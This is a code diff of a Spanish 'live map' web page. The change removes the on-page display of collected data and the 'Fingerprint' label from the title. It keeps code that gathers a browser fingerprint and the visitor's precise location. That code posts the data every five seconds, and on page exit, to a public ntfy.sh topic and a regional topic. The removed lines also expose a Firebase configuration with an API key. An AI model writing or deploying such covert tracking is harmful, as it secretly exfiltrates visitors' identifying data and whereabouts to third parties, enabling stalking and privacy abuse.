@@ -2,59 +2,49 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Mapa en vivo con Firebase + Fingerprint</title>
+  <title>Mapa en vivo</title>
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { 
-      margin:0; 
-      padding:0; 
-      background:#121212; 
-      font-family:monospace; 
-      color:#0f0; 
-      display:flex; 
-      flex-direction:column; 
-      align-items:center; 
+    body {
+      margin:0;
+      padding:0;
+      background:#121212;
+      font-family:monospace;
+      color:#0f0;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
     }
     h2 { margin-top:20px; }
-    input, button { 
-      padding:10px; 
-      margin:5px; 
-      font-size:16px; 
-      background:#1e1e1e; 
-      color:#0f0; 
-      border:1px solid #00ff00; 
-      border-radius:5px; 
+    input, button {
+      padding:10px;
+      margin:5px;
+      font-size:16px;
+      background:#1e1e1e;
+      color:#0f0;
+      border:1px solid #00ff00;
+      border-radius:5px;
     }
     button { cursor:pointer; }
     button:hover { background:#2a2a2a; }
-    .map-section { 
-      width:90%; 
-      max-width:600px; 
-      height:400px; 
-      margin:20px 0; 
-      box-shadow:0 0 30px rgba(0,0,0,0.7); 
-      border-radius:15px; 
-      overflow:hidden; 
+    .map-section {
+      width:90%;
+      max-width:600px;
+      height:400px;
+      margin:20px 0;
+      box-shadow:0 0 30px rgba(0,0,0,0.7);
+      border-radius:15px;
+      overflow:hidden;
     }
     #map { width:100%; height:100%; }
-    .leaflet-popup-content-wrapper { 
-      background:#1e1e1e; 
-      color:#00ff00; 
-      font-weight:bold; 
-      border-radius:10px; 
+    .leaflet-popup-content-wrapper {
+      background:#1e1e1e;
+      color:#00ff00;
+      font-weight:bold;
+      border-radius:10px;
     }
     .leaflet-popup-tip { background:#1e1e1e; }
-    pre { 
-      width:90%; 
-      max-width:600px; 
-      background:#1e1e1e; 
-      padding:10px; 
-      border-radius:10px; 
-      overflow-x:auto; 
-      max-height:200px;
-      overflow-y:auto;
-    }
     .status {
       padding:10px;
       margin:10px;
@@ -72,65 +62,45 @@
   </style>
 </head>
 <body>
-<h2>Mapa en vivo con Firebase + Fingerprint</h2>
+<h2>Mapa en vivo</h2>
 <div class="controls">
   <input type="text" id="nick" placeholder="Escribe tu Nick" />
   <button id="startBtn">Iniciar Seguimiento</button>
 </div>
 <div class="status offline" id="status">Desconectado</div>
 <div class="map-section"><div id="map"></div></div>
-<pre id="output">Los datos aparecerán aquí...</pre>
 
 <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-<!-- Firebase App (el core de Firebase) -->
-<script src="https://www.gstatic.com/firebasejs/10.6.1/firebase-app.js"></script>
-<!-- Firebase Database -->
-<script src="https://www.gstatic.com/firebasejs/10.6.1/firebase-database.js"></script>
 
 <script>
-// Configuración de Firebase
-const firebaseConfig = {
-  apiKey: "AIzaSyCsM5ynPDbJCUV7HXq5NA3mmIXKxczc_RA",
-  authDomain: "sypherionmaps.firebaseapp.com",
-  databaseURL: "https://sypherionmaps-default-rtdb.firebaseio.com",
-  projectId: "sypherionmaps",
-  storageBucket: "sypherionmaps.firebasestorage.app",
-  messagingSenderId: "529754955214",
-  appId: "1:529754955214:web:c6b25dbafc9172eeb8df9f"
-};
-
-// Inicializar Firebase
-const app = firebase.initializeApp(firebaseConfig);
-const database = firebase.database();
-
 // Configuración del mapa
 const map = L.map('map').setView([0,0],2);
 L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{
-  attribution:'&copy; OpenStreetMap &copy; Carto', 
-  subdomains:'abcd', 
+  attribution:'&copy; OpenStreetMap &copy; Carto',
+  subdomains:'abcd',
   maxZoom:20
 }).addTo(map);
 
 // Iconos para marcadores
-const greenIcon = L.icon({ 
-  iconUrl:"https://cdn-icons-png.flaticon.com/512/64/64572.png", 
-  iconSize:[50,50], 
-  iconAnchor:[25,50], 
-  popupAnchor:[0,-50] 
+const greenIcon = L.icon({
+  iconUrl:"https://cdn-icons-png.flaticon.com/512/64/64572.png",
+  iconSize:[50,50],
+  iconAnchor:[25,50],
+  popupAnchor:[0,-50]
 });
 
-const redIcon = L.icon({ 
-  iconUrl:"https://cdn-icons-png.flaticon.com/512/64/64576.png", 
-  iconSize:[50,50], 
-  iconAnchor:[25,50], 
-  popupAnchor:[0,-50] 
+const redIcon = L.icon({
+  iconUrl:"https://cdn-icons-png.flaticon.com/512/64/64576.png",
+  iconSize:[50,50],
+  iconAnchor:[25,50],
+  popupAnchor:[0,-50]
 });
 
 // Variables globales
 let uid = "";
 let userMarker = null;
 let userCircle = null;
-let markers = {}; // Para guardar marcadores de todos los usuarios
+let markers = {};
 let info = {};
 let topicRegion = "";
 let positionUpdateInterval;
@@ -154,8 +124,8 @@ async function getFingerprint() {
     const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
     const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
     info.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "No detectada";
-  } catch(e) { 
-    info.gpu = "No detectada"; 
+  } catch(e) {
+    info.gpu = "No detectada";
   }
   
   return info;
@@ -195,11 +165,11 @@ async function getLocationAndSend(nick) {
     }).addTo(map);
     
     let growing = true;
-    setInterval(() => { 
-      let r = userCircle.getRadius(); 
-      if(r >= 200) growing = false; 
-      if(r <= 100) growing = true; 
-      userCircle.setRadius(growing ? r+5 : r-5); 
+    setInterval(() => {
+      let r = userCircle.getRadius();
+      if(r >= 200) growing = false;
+      if(r <= 100) growing = true;
+      userCircle.setRadius(growing ? r+5 : r-5);
     }, 100);
 
     // Obtener fingerprint
@@ -212,8 +182,8 @@ async function getLocationAndSend(nick) {
       const data = await res.json();
       region.country = data.address.country || "Unknown";
       region.city = data.address.city || data.address.town || data.address.village || "Unknown";
-    } catch(e) { 
-      console.log("Error geocoding:", e); 
+    } catch(e) {
+      console.log("Error geocoding:", e);
     }
 
     // Agregar coordenadas y link
@@ -224,74 +194,32 @@ async function getLocationAndSend(nick) {
     info.city = region.city;
     info.timestamp = new Date().toISOString();
     info.nick = nick;
-    
-    // Mostrar información en el panel
-    document.getElementById("output").textContent = JSON.stringify(info, null, 2);
 
     // Topic simple: concatenar país + ciudad sin espacios ni /
     topicRegion = (region.country + region.city).replace(/\s+/g, '').replace(/\//g, '');
     
-    // Enviar al principal
-    fetch('https://ntfy.sh/SypherioNoctvox', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(info)
-    });
-    
-    // Enviar al topic regional simple
-    fetch(`https://ntfy.sh/${topicRegion}`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(info)
-    });
-    
-    // Guardar en Firebase
-    database.ref("usuarios_online/" + uid).set({
-      nick,
-      latitude: lat,
-      longitude: lon,
-      googleMapsLink: info.googleMapsLink,
-      online: true,
-      timestamp: Date.now(),
-      fingerprint: info
-    });
+    // Enviar notificaciones
+    try {
+      // Enviar al principal
+      await fetch('https://ntfy.sh/SypherioNoctvox', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(info)
+      });
+      
+      // Enviar al topic regional simple
+      await fetch(`https://ntfy.sh/${topicRegion}`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(info)
+      });
+    } catch (e) {
+      console.error("Error enviando a ntfy:", e);
+    }
     
     // Actualizar estado
     document.getElementById("status").textContent = "Conectado";
     document.getElementById("status").className = "status online";
-    
-    // Escuchar todos los usuarios en tiempo real
-    database.ref("usuarios_online").on('value', (snapshot) => {
-      const users = snapshot.val() || {};
-      
-      // Eliminar marcadores de usuarios que ya no están
-      for (const key in markers) {
-        if (!users[key]) {
-          map.removeLayer(markers[key]);
-          delete markers[key];
-        }
-      }
-      
-      // Añadir o actualizar marcadores
-      for (const key in users) {
-        const data = users[key];
-        
-        // No mostrar nuestro propio marcador otra vez (ya lo tenemos)
-        if (key === uid) continue;
-        
-        if (markers[key]) {
-          // Actualizar posición existente
-          markers[key].setLatLng([data.latitude, data.longitude]);
-          markers[key].setIcon(data.online ? greenIcon : redIcon);
-          markers[key].setPopupContent(`${data.nick}${data.online ? "" : " (Desconectado)"}`);
-        } else {
-          // Crear nuevo marcador
-          markers[key] = L.marker([data.latitude, data.longitude], {
-            icon: data.online ? greenIcon : redIcon
-          }).addTo(map).bindPopup(`${data.nick}${data.online ? "" : " (Desconectado)"}`);
-        }
-      }
-    });
 
     // Actualizar posición cada 5 segundos
     if (positionUpdateInterval) {
@@ -302,15 +230,27 @@ async function getLocationAndSend(nick) {
       navigator.geolocation.getCurrentPosition(pos => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
-        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
         
-        database.ref("usuarios_online/" + uid).update({
-          latitude: lat,
-          longitude: lon,
-          googleMapsLink: googleMapsLink,
-          online: true,
-          timestamp: Date.now()
-        });
+        // Actualizar información
+        info.latitude = lat;
+        info.longitude = lon;
+        info.googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        info.timestamp = new Date().toISOString();
+        
+        // Enviar actualización a los topics
+        fetch('https://ntfy.sh/SypherioNoctvox', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(info)
+        }).catch(e => console.error("Error actualizando ntfy:", e));
+        
+        if (topicRegion) {
+          fetch(`https://ntfy.sh/${topicRegion}`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(info)
+          }).catch(e => console.error("Error actualizando ntfy regional:", e));
+        }
         
         // Actualizar nuestra posición en el mapa
         userMarker.setLatLng([lat, lon]);
@@ -339,34 +279,26 @@ document.getElementById("startBtn").onclick = () => {
 
 // Aviso de desconexión
 window.addEventListener("beforeunload", () => {
-  if (uid) {
-    // Enviar estado offline a Firebase
-    database.ref("usuarios_online/" + uid).update({
-      online: false,
-      timestamp: Date.now()
-    });
+  if (uid && info.latitude) {
+    const desconexion = {
+      ...info,
+      event: "desconexión",
+      timestamp: new Date().toISOString()
+    };
     
     // Enviar notificación de desconexión
-    if (info.latitude) {
-      const desconexion = {
-        ...info, 
-        event: "desconexión", 
-        timestamp: new Date().toISOString()
-      };
-      
-      fetch('https://ntfy.sh/SypherioNoctvox', {
+    fetch('https://ntfy.sh/SypherioNoctvox', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(desconexion)
+    }).catch(e => console.error("Error enviando desconexión:", e));
+    
+    if (topicRegion) {
+      fetch(`https://ntfy.sh/${topicRegion}`, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(desconexion)
-      });
-      
-      if (topicRegion) {
-        fetch(`https://ntfy.sh/${topicRegion}`, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify(desconexion)
-        });
-      }
+      }).catch(e => console.error("Error enviando desconexión regional:", e));
     }
   }
 });
